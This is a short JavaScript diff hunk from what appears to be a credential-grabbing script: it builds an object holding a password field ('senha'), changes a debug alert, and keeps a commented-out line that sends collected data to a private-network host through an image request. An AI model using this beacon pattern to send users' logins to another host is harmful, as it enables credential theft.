@@ -5,7 +5,7 @@ var array = {
 	'senha' : items[1]
 }
 
-alert('usuario');
+alert('array.login');
 
 
 // new Image().src = "http://192.168.0.123/?=" + retorno
